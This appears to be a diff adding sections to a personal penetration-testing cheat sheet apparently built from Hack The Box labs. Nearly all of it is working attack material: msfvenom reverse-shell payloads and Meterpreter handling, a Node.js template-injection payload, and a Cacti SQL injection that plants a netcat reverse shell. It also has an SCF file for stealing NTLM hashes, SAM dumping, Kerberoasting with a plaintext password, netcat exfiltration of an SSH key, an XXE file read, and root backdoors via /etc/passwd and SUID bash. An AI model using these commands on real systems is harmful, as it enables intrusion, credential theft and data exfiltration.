@@ -299,9 +299,25 @@ ruby evil-winrm.rb -i heist.htb -u Chase -p 'Q4)sJu\Y8qz*A3?d'
 KERBEROAST
 impacket-secretsdump egotistical-bank.local/svc_loanmgr@10.129.152.219
 
+METASPLOIT HANDLER/PRIVESC
+ssh into suggester: scanner/ssh/ssh_login 
+msf> search type:exploit platform:windows target:2008 smb
+searchsploit microsoft smb
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.58 LPORT=6666 -f aspx -o revshell.aspx
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.58 LPORT=6666 -f exe > shell64.exe
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.14.98 LPORT=4444 -f elf > rev.elf
+use exploit/multi/handler
+UPGRADE: CTRL+Z, sessions -u 1
+set payload windows/meterpreter/reverse_tcp
+use post/multi/recon/local_exploit_suggester
+run -j
+background
+sessions -i 1
+ps
+migrate 1828
 
-
-
+MSFVENOM
+msfvenom -f dll -p windows/exec CMD="C:\Windows\system32\calc.exe" -o shell32.dll
 
 FCRACKZIP
 fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
@@ -317,7 +333,9 @@ load kiwi
 getsystem
 creds_msv
 
-
+JSON SSTI POST request (replace email by the right param)
+{"email":"{{range.constructor(\"return global.process.mainModule.
+require('child_process').execSync('id')\")()}}"}
 
 WRITABLE /etc/passwd
 echo "toor1:aaKNIEDOaueR6:0:0:toor:/root:/bin/bash" >> /etc/passwd 
@@ -343,6 +361,129 @@ ssh -p 2222 -L 5555:localhost:5555 kristi@explore.htb
 BURP INJECT HEADER
 Burp suite doesnt allow to inject a header but we can match & replace something like User-Agent and put what we need.
 
+SQL INJECTIONS
+admin' or '1' = '1
+Copy to file login request from Burp name it "req"
+sqlmap -r req --risk=3 --level=3 --batch --force-ssl
+
+PERL SUID oneliner
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "id";'
+
+PERL SUID script
+#!/usr/bin/perl
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec "/bin/bash";
+
+SMB
+smbclient -N -L \\\\10.10.10.27\\
+smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>
+smbmap -H <IP> [-P <PORT>] #Null user
+smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
+smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
+crackmapexec smb <IP> -u '' -p '' --shares #Null user
+crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
+crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
+smbmap -R FolderName -H 10.10.10.100 -A Filename.xml -q
+smbclient -L \\active.htb -U SVC_TGS
+smbclient -N //10.129.146.152/general
+recurse ON
+mget *
+smbclient \\\\cascade\\Audit$ -U s.smith -c 'prompt OFF;recurse ON;mget *'
+C:\WIndows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+sudo apt install samdump2
+samdump2 -o out_file SYSTEM SAM
+msfconsole use winrm
+impacket-lookupids
+procdump https://download.sysinternals.com/files/Procdump.zip
+
+WINDOWS SHARE ON LINUX
+sudo mount -t cifs -o username=guest //10.129.127.236/Shares /mnt/timelapse
+
+SMB HASH STEAL
+1)Create file named hash.scf:
+[Shell]
+Command=2
+IconFile=\\10.10.14.108\share\pentestlab.ico
+[Taskbar]
+Command=ToggleDesktop
+2)Start responder
+sudo responder -I tun0
+3)Upload file and get hash when a user logs on
+KERBEROASTING
+python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.129.145.201 -request
+python /usr/share/doc/python3-impacket/examples/wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.145.201
+
+PLAY SOUND FILE ON WINDOW
+powershell -c (New-Object Media.SoundPlayer "http://localhost:7878/r2d2.wav").Play(); Start-Sleep -s 5; Exit;
+
+BACKUP
+scp -r htb-lawinn@htb-uccb72lwbw.htb-cloud.com:/home/htb-lawinn/my_data G:\Pentest\HTB\my_data
+
+STEGO
+steghide extract -sf out.jpg
+
+SQL injection (SQLi)
+Rev shell
+GET /cacti/color.php?action=export&header=false&filter=1') UNION SELECT 1,username,password,4,5,6,7 from user_auth;update settings set value='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.85 5555 >/tmp/f;' where name='path_php_binary';-- - HTTP/1.1
+-> URL encode it
+
+BUFFER OVERFLOW
+GENERATE PATTERN
+/usr/share/metasploit-framework/tools/pattern_create.rb 11000
+
+MYSQL/SQL local
+mysql -u ona_sys -p
+show databases;
+use SuperDB;
+show tables;
+
+When doing sql queries, if you add \G to the end, it will show the fields in a vertical list which makes tables with a lot of fields sooo much easier to read.  e.g., SELECT * FROM users\G;
+
+TOMCAT
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=6666 -f war -o rev.war
+
+PHP HTTPSERVER
+php -S 0.0.0.0:8000
+
+UNZIP
+gzip -kd archive.gz
+tar -xvf archive.tar
+
+EXFILTRATE
+nc <YOUR IP> <PORT> < id_rsa
+nc -nlvp <PORT> > id_rsa
+
+MITM/PROXY NETCAT
+ncat --sh-exec "ncat.exe IPofM340 502" -lk 502
+ncat --sh-exec "ncat 10.236.181.104 27000" -lk 27000
+ncat --sh-exec "ncat.exe gateway.zscaler.net 80" -lk 8080
+
+NCAT crlf:
+ncat -C
+
+XXE
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  
+           <bugreport>  
+           <title>&xxe;</title>
+           
+SUID (THROUGH ROOT CMD EXEC)
+chmod +s /bin/bash
+bash -p
+#
+
+PATH INJECTION VULN
+export PATH=$(pwd):$PATH
+and put your own crafted binary when it is called directly in a script as root
+
+ADD IPs and ROUTES ON WINDOWS
+netsh interface ipv4 show interfaces
+netsh interface ipv4 add address "GigabitPLCSwitch" 192.168.137.185 255.255.0.0
+Delete: netsh interface ipv4 delete address "GigabitPLCSwitch" 192.168.137.185
+route print
+route add 133.12.0.0 MASK 255.255.0.0 133.11.27.101 IF 14
+route DELETE 133.12.0.0
 
 
 
